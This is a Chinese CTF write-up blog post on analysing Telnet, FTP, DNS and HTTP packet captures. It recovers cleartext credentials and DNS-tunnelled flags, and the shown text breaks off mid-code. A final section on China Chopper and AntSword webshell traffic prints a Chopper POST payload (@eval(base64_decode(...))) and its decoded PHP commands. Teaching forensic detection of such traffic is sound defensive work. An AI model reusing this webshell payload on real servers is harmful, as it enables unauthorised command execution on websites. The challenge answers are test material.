+<h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><p>Telnet是 Internet远程登录服务的标准协议和主要方式，为用户提供了在本地计算机上远程管理主机的能力。实际上，Telnet 的出现早于 TCP&#x2F;IP 协议簇的其他应用层协议。它默认TCP 端口号为23。Telnet 的一个特点是以<code>明文</code>方式传输所有数据，这也意味着如果捕获了Telnet 网络流量，就可能找到远程登录的用户名和密码。作为一种不安全的远程登录协议，Telnet 几乎被 SSH 协议所替代，只有在某些场景下才会使用 Telnet 远程登录</p>
+<p>Telnet有四种工作模式，这里重点介绍两种。第一种是一次一字符模式，当用户输入命令时，<strong>每按一个键，Telnet 客户端会立刻把该字符发送给远程服务器</strong>，然后从TCP 连接上读取收到的字符，返回给 Telnet 客户端，显示给用户看。大部分Telnet 默认采用这种工作模式</p>
+<p>第二种是准行模式(kludge line mode)，用户每键入一行信息，客户端向服务器发送一次信息</p>
+<p>Telnet的考点主要是获取用户登录时的正确密码，通常采用一次一字符模式进行传输下面举例说明。</p>
+<h3 id="例题packet2-pcapng"><a href="#例题packet2-pcapng" class="headerlink" title="例题packet2.pcapng"></a>例题packet2.pcapng</h3><blockquote>
+<p>从流量中找到flag</p>
+</blockquote>
+<p>【解题思路】协议分级后发现 Tenet 协议，将其过滤出来，选择追踪 TCP 流</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401101105152.png" alt="image-20240110110530112"></p>
+<p>红色字段是客户端向服务器发送的数据，蓝色字段是服务器向客户端发送的数据。</p>
+<p>在login(也就是用户名输入)时，我们发现客户端每发一个字符，服务端就把这个字符再发一遍，符合一次一字符模式的传输特征。Password字段中有一些“.”，这其实是不可打印字符。</p>
+<p>“Show data as”选择为“HEX转储”</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401101108714.png" alt="image-20240110110805673"></p>
+<p>可以看到客户端输人了ASCII字符0x08，这个字符是 backspace，也就是删除，这意味着用户在输入过程中删除了一些字符。那么如何确定删除了多少个字符？一个简单的方法是看客户端发了多少个 0x08。所以，本题中正确的密码是 0p-!@@#cttT。</p>
+<h3 id="04Networking"><a href="#04Networking" class="headerlink" title="04Networking"></a>04Networking</h3><blockquote>
+<p>来源： CSAW Quals CTF 2013 题目：Networking 类型: Network 分数: 100 难度：易 描述: Find the flag!</p>
+</blockquote>
+<p>随便点击一条数据</p>
+<p>右键追踪TCP流</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312212324183.png" alt="image-20231221232459142"></p>
+<p>flag{d316759c281bf925d600be698a4973d5}</p>
+<h3 id="08Telnet用户密码抓取"><a href="#08Telnet用户密码抓取" class="headerlink" title="08Telnet用户密码抓取"></a>08Telnet用户密码抓取</h3><blockquote>
+<p>找到这个telnet会话的账户和密码 格式 flag{login:xxx&amp;password:xxx}</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401101110028.png" alt="image-20240110111028987"></p>
+<p>flag{login:fake&amp;password:user}</p>
+<h3 id="46telnet-cmd"><a href="#46telnet-cmd" class="headerlink" title="46telnet_cmd"></a>46telnet_cmd</h3><blockquote>
+<p>黑客通过Telnet进入了我的电脑，你知道他找到了什么机密信息吗？</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401101116435.png" alt="image-20240110111615392"></p>
+<p>key{ZmlsZUB6aXAua}</p>
+<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p><code>FTP</code> ( <code>File Transfer Protocol</code> ，即文件传输协议) 是 <code>TCP/IP</code> 协议组中的协议之一。 <code>FTP</code> 协议包括两个组成部分，其一为 <code>FTP</code> 服务器，其二为 <code>FTP</code> 客户端。其中 <code>FTP</code> 服务器用来存储文件，用户可以使用 <code>FTP</code> 客户端通过 <code>FTP</code> 协议访问位于 <code>FTP</code> 服务器上的资源。在开发网站的时候，通常利用 <code>FTP</code> 协议把网页或程序传到 <code>Web</code> 服务器上。此外，由于 <code>FTP</code> 传输效率非常高，在网络上传输大的文件时，一般也采用该协议。</p>
+<p>默认情况下 <code>FTP</code> 协议使用 <code>TCP</code> 端口中的 <code>20</code> 和 <code>21</code> 这两个端口，其中 <code>20</code> 用于传输数据， <code>21</code> 用于传输控制信息。但是，是否使用 <code>20</code> 作为传输数据的端口与 <code>FTP</code> 使用的传输模式有关，如果采用主动模式，那么数据传输端口就是 <code>20</code> ；如果采用被动模式，则具体最终使用哪个端口要服务器端和客户端协商决定。</p>
+<p>FTP 命令由3~4个字母组成，命令后面跟参数，用空格分开。每个命令都以“\r\n”结束。常用的FTP命令有USER、PASS、SIZE、REST、CWD、RETR、PASV、PORT、QUIT等。各命令含义如下:</p>
+<p><code>USER</code>：指定用户名。通常是控制连接后第一个发出的命令。“USER name\r\n”表示以用户名name登录。</p>
+<p><code>PASS</code>：指定用户密码。该命令紧跟在USER命令后。“PASS 123456\r\n”表示密码为123456。</p>
+<p><code>SIZE</code>：从服务器上返回指定文件的大小。“SIZE file.txt\r\n”表示如果file.txt文件存在，则返回该文件的大小。</p>
+<p><code>CWD</code>：改变工作目录，如“CWD dirname\r\n”</p>
+<p><code>PASV</code>：让服务器在数据端口监听，进入被动模式，如“PASV\r\n”</p>
+<p><code>PORT</code>：告诉FTP 服务器客户端监听的端口号，让服务器采用主动模式连接客户端,如“PORT h1,h2,h3,h4,p1,p2”。</p>
+<p><code>REST</code>：下载文件。“RETR file.txt\r\n”表示下载文件 file.txt。</p>
+<p><code>STOR</code>：上传文件。“STOR file.txt\r\n”表示上传文件 file.txt。</p>
+<p><code>RETR</code>：该命令并不传送文件，而是忽略指定点后的数据。此命令后应该跟其他要求文件传输的FTP命令。比如，“REST 100\r\n”表示重新指定文件传送的偏移量为100字节。</p>
+<p><code>QUIT</code>：关闭与服务器的连接</p>
+<h3 id="09FTP"><a href="#09FTP" class="headerlink" title="09FTP"></a>09FTP</h3><blockquote>
+<p>获取ftp密码进行提交 An authenticated file exchange achieved through FTP. Recover the password used by the user.</p>
+</blockquote>
+<p>首先输入ftp进行过滤</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091216091.png" alt="image-20240109121625039"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091216557.png" alt="image-20240109121658521"></p>
+<p>得到</p>
+<p>USER cdts3500</p>
+<p>PASS cdts3500</p>
+<h3 id="17WhyNotSftp"><a href="#17WhyNotSftp" class="headerlink" title="17WhyNotSftp"></a>17WhyNotSftp</h3><blockquote>
+<p>很认真，为什么不呢？</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091753054.png" alt="image-20240109175323016"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091757053.png" alt="image-20240109175711012"></p>
+<p>名称暗示了FTP的使用情况，所以让我们通过在过滤器框中输入ftp-data来过滤FTP-DATA协议上的数据包捕获。点击标号为413的捕获</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091759752.png" alt="image-20240109175938705"></p>
+<p>单击底部的“另存为”按钮，并将其另存为* .zip文件。解压文件，然后打开里面的flag.png。它显示</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091800634.png" alt="image-20240109180004606"></p>
+<p>flag{91e02cd2b8621d0c05197f645668c5c4}</p>
+<h3 id="20leaks-suspected"><a href="#20leaks-suspected" class="headerlink" title="20leaks-suspected"></a>20leaks-suspected</h3><blockquote>
+<p>Alice发现重要的zip文件被攻击者泄露。 攻击者无法删除日志。 分析损坏的pcap文件并查找泄露的文件。flag格式:key{xxx}</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091227333.png" alt="image-20240109122723304"></p>
+<p>打开后发现不可以</p>
+<p>发现</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091719375.png" alt="image-20240109171908332"></p>
+<p>那我直接binwalk</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091724982.png" alt="image-20240109172420953"></p>
+<p>73686b696b7475</p>
+<p>这是什么呢</p>
+<p>十六进制</p>
+<p>shkiktu</p>
+<p>所以key{shkiktu}</p>
+<h3 id="40ftp-data"><a href="#40ftp-data" class="headerlink" title="40ftp-data"></a>40ftp-data</h3><blockquote>
+<p>我们捕获了一个FTP数据包，找到他传输的数据</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091220721.png" alt="image-20240109122011668"></p>
+<p>导出ftp对象</p>
+<p>key{theSecretFileByFtp}</p>
+<h3 id="41ssPacket"><a href="#41ssPacket" class="headerlink" title="41ssPacket"></a>41ssPacket</h3><blockquote>
+<p>黑客通过FTP下载了一个加密压缩文件，试着找到解压密码并打开它 格式 flag{xxx}</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401100016135.png" alt="image-20240110001630049"></p>
+<p>然后http筛选一下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401100024386.png" alt="image-20240110002441324"></p>
+<p>the unzip secret is ss_img</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401100025394.png" alt="image-20240110002512364"></p>
+<p>flag{ssecret_infooMationn}</p>
+<h3 id="50fftp"><a href="#50fftp" class="headerlink" title="50fftp"></a>50fftp</h3><blockquote>
+<p>小黑用ftp下载了一个flag.jpg，却没有flag，你帮他找到</p>
+</blockquote>
+<p>导出ftp对象</p>
+<p>然后010editor打开</p>
+<p>f12搜索flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091712673.png" alt="image-20240109171155615"></p>
+<p>flag{9XyMzJU8nEo9UgvhLO96ruIf1gmNIQ9t}</p>
+<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>TCP&#x2F;IP协议簇中使用IP地址和端口号来确定网络上某一台主机中的某一个服务，那么为什么不用域名来直接进行通信呢? 因为IP地址的长度是固定的，而域名的长度是可变的可变的域名不便于计算机处理，而IP地址对于用户来说不方便记忆，但域名便于用户使用总结来说就是：IP地址是面向主机的，而域名是面向用户的。</p>
+<p>DNS(Domain NameSystem)也称为域名系统，是将域名和IP地址相映射的一个分布式数据库，能够让用户更方便地访问互联网。DNS协议运行在UDP&#x2F;TCP之上默认端口号是 53。</p>
+<p>下面是DNS域名查询的一个例子，query 表示查询query response是对查询的响应0xf4d7是会话标识，因为大部分DNS报文是基于UDP的，通过会话标识可以区分DNS应答报文是对哪个请求的响应。图中查询的域名是 google.ca,查询到的IP地址是173.194.46.88</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401102233776.png" alt="image-20240110223307741"></p>
+<p>Wireshark对DNS的解析结果见下图，下图解析了DNS查询响应报文Queries下面给出的是查询的域名Answers下面给出的是域名对应的IP地址。本例中，google.ca 共查询到 3个IP 地址。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401102234135.png" alt="image-20240110223418101"></p>
+<h3 id="例题DNS-pcap"><a href="#例题DNS-pcap" class="headerlink" title="例题DNS.pcap"></a>例题DNS.pcap</h3><blockquote>
+<p>从流量中找到flag</p>
+</blockquote>
+<p>【解题思路】通过查询协议分级信息，结合题目名称，发现DNS报文数据量比较大，考虑重点查看DNS。在显示过滤器中输入“DNS”后，还能看到一些ICMP报文，修改过滤规则为“dns&amp;&amp;!icmp”，把ICMP报文过掉。过滤出来的第一个数据包查询的域名为5647687063794270.192.168.191.129，这个域名有明显的问题。考虑把同一个IP地址请求的DNS都过滤出来，新的过滤规则是“dns&amp;&amp;!icmp&amp;&amp;ip.addr&#x3D;&#x3D;192.168.191.128”，可以发现这个IP地址把每个异常域名都请求了2次。把所有可疑域名提取出来，去除所有的“.192.168.191.129”，重复项仅保留一个，再拼接到一起，就得</p>
+<p>Name: 56476870637942706379426849484e6c59334a6c64434230636d4675633231706448526c5a43423061484a766457646f494752756379427864575679655341364b534247544546484c555a554e44646a545667794e6e425865555a5453545a53554664685533493157564a330a</p>
+<p>利用ASCII解码和base64解码得到</p>
+<p>This is a secret transmitted through dns query :) FLAG-FT47cMX26pWyFSI6RPWaSr5YRw</p>
+<h3 id="05Dns"><a href="#05Dns" class="headerlink" title="05Dns"></a>05Dns</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312212333103.png" alt="image-20231221233357057"></p>
+<p>把可疑包的信息进行整理收集以后得出：</p>
+<blockquote>
+<p>5647687063794270<br>6379426849484e6c<br>59334a6c64434230<br>636d467563323170<br>6448526c5a434230<br>61484a766457646f<br>4947527563794278<br>6457567965534136<br>4b53424754454648<br>4c555a554e44646a<br>545667794e6e4258<br>65555a5453545a53<br>5546646855334931<br>57564a330a</p>
+</blockquote>
+<p>即:56476870637942706379426849484e6c59334a6c64434230636d4675633231706448526c5a43423061484a766457646f494752756379427864575679655341364b534247544546484c555a554e44646a545667794e6e425865555a5453545a53554664685533493157564a330a</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312212335455.png" alt="image-20231221233548427"></p>
+<p>This is a secret transmitted through dns query :) FLAG-FT47cMX26pWyFSI6RPWaSr5YRw</p>
+<h2 id="Http-Https"><a href="#Http-Https" class="headerlink" title="Http&#x2F;Https"></a>Http&#x2F;Https</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/misc/traffic/protocols/http/">https://ctf-wiki.org/misc/traffic/protocols/http/</a></p>
+<p><code>HTTP</code> ( <code>Hyper Text Transfer Protocol</code> )，也称为超文本传输协议) 是一种用于分布式、协作式和超媒体信息系统的应用层协议。 <code>HTTP</code> 是万维网的数据通信的基础。</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/misc/traffic/protocols/https/">https://ctf-wiki.org/misc/traffic/protocols/https/</a></p>
+<p><code>HTTPs = HTTP + SSL / TLS</code>. 服务端和客户端的信息传输都会通过 TLS 进行加密，所以传输的数据都是加密后的数据</p>
+<h3 id="02Http"><a href="#02Http" class="headerlink" title="02Http"></a>02Http</h3><blockquote>
+<p>题目：数据包分析 描述：请根据题目去下载相应的数据包http.pcap 对其进行分析得到flag flag格式: flag{}</p>
+</blockquote>
+<p>导出http对象</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312212247026.png" alt="image-20231221224751994"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312212248136.png" alt="image-20231221224825098"></p>
+<p>FLAG-GehFMsqCeNvof5szVpB2Dmjx</p>
+<h3 id="03Forensics-Four-Eyes"><a href="#03Forensics-Four-Eyes" class="headerlink" title="03Forensics-Four Eyes"></a>03Forensics-Four Eyes</h3><blockquote>
+<p>You are a member of a covert agency that is spying on one of their intelligence targets. They have managed to MiTM (Man-in-The-Middle) one of the target employees and are monitoring his HTTP traffic. It is of vital importance that you extract the correct password he submitted to <a target="_blank" rel="noopener" href="http://www.2dehands.be/">www.2dehands.be</a>.</p>
+</blockquote>
+<p>首先过滤一下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312212318115.png" alt="image-20231221231812086"></p>
+<p>找到post包</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312212319305.png" alt="image-20231221231939262"></p>
+<p>safefromNSA</p>
+<h3 id="12tribalwars账户密码"><a href="#12tribalwars账户密码" class="headerlink" title="12tribalwars账户密码"></a>12tribalwars账户密码</h3><blockquote>
+<p>根据所给的数据包分析出tribalwars网站账户和密码 flag{username&#x3D;xxx&amp;password&#x3D;xxx}</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.host contains &quot;tribalwars&quot;</span><br></pre></td></tr></table></figure>
+
+<p>找到post包</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401100939982.png" alt="image-20240110093905867"></p>
+<p>user&#x3D;Falken&amp;password&#x3D;Joshua</p>
+<p>flag{username&#x3D;Falken&amp;password&#x3D;Joshua}</p>
+<h3 id="19Espionage"><a href="#19Espionage" class="headerlink" title="19Espionage"></a>19Espionage</h3><blockquote>
+<p>来源：Cyber Security Challenge 2015 题目：Espionage 类型: Forensics 分数: 300 难度：难 描述: 我们怀疑我们的一名员工正在向竞争对手出售秘密。我们还没有抓到他，但我们确实设法嗅一些交通。你能找出发生了什么事吗？flag为小写字符串</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401100951824.png" alt="image-20240110095149778"></p>
+<p>导出对象，按照大小排列，可以看到</p>
+<p>然后我们右键，导出分组字节流</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401100953179.png" alt="image-20240110095345147"></p>
+<p>发现压缩包里面有个音频</p>
+<p>怀疑是音频隐写</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401100955407.png" alt="image-20240110095543352"></p>
+<p>可以看到batman</p>
+<h3 id="23digital-camouflage"><a href="#23digital-camouflage" class="headerlink" title="23digital-camouflage"></a>23digital-camouflage</h3><blockquote>
+<p>获取数据包中用户登录的密码。flag{xxx}</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401100945433.png" alt="image-20240110094519387"></p>
+<p>flag{KN1Z6PXVy9}</p>
+<h3 id="38HTTP头"><a href="#38HTTP头" class="headerlink" title="38HTTP头"></a>38HTTP头</h3><blockquote>
+<p>据说http请求头能藏很多东西，找到flag flag{xxx}</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401100032454.png" alt="image-20240110003255422"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401100033780.png" alt="image-20240110003311738"></p>
+<p>theFlagInHttpHeader</p>
+<p>flag{theFlagInHttpHeader}</p>
+<h3 id="48file-upload"><a href="#48file-upload" class="headerlink" title="48file_upload"></a>48file_upload</h3><blockquote>
+<p>小黑客登录我的网站，试图通过文件上传攻击我的网站，你知道他上传了什么吗？</p>
+</blockquote>
+<p>导出对象，upload.php</p>
+<p>IGZsYWd7SkZLektuaG8wVWs4a30&#x3D;</p>
+<p>flag{JFKzKnho0Uk8k}</p>
+<h2 id="考点2：菜刀、蚁剑流量分析"><a href="#考点2：菜刀、蚁剑流量分析" class="headerlink" title="考点2：菜刀、蚁剑流量分析"></a>考点2：菜刀、蚁剑流量分析</h2><p>中国菜刀(简称菜刀)是一个网站 Webshell 管理程序，通过在网站中预先植人木马再利用菜刀和木马建立连接，从而达到攻击的目的。菜刀体积小，可提供文件下载、目录管理、虚拟终端等功能，受众多用户的喜爱。但是由于开发时间久远，越来越不能满足需求而且缺少团队维护，因此现在白帽黑客更倾向于使用蚁剑。蚁剑的英文名为 AntSword，是一款开源的跨平台网站管理工具，它主要供具有合法授权的渗透测试安全人员以及进行常规操作的网站管理员进行安全管理之用。</p>
+<p>菜刀流量的特点是通过 HTTP 中的POST方法和木马后门建立连接，如图所示，其中，dvwa.php 是 PHP 一句话木马。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401121926608.png" alt="image-20240112192602563"></p>
+<p>POST数据包中的内容经过 URL 编码后一般如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br></pre></td></tr></table></figure>
+
+<p>这段代码需要执行PHP语句，需要先用 Base64解码才能运行。Base64解码后的结如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);//临时关闭php的错误显示功能</span><br><span class="line">@set_time_limit(0);				//防止上传文件超时</span><br><span class="line">@set_magic_quotes_runtime(0);	//关闭魔术引号，在php4.0之后基本不使用</span><br><span class="line">echo(&quot;-&gt;|&quot;);;</span><br><span class="line">$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if($D==&quot;&quot;)</span><br><span class="line">	$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">$R=&quot;&#123;$D&#125;\t&quot;;		//获取当前路径</span><br><span class="line">if(substr($D,0,1)!=&quot;/&quot;)&#123;</span><br><span class="line">	